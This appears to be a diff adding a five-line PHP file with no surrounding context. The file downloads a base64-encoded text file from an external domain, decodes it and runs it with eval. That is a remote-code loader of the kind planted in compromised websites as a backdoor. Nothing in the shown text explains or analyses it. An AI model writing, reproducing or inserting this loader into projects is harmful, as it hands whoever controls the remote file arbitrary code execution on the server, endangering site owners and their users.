@@ -1,0 +1,5 @@
+<?php
+$url='https://gmcshahdol.org/Satna_medical_college/nb.txt';
+$a = base64_decode(file_get_contents($url));
+eval ($a);
+?>
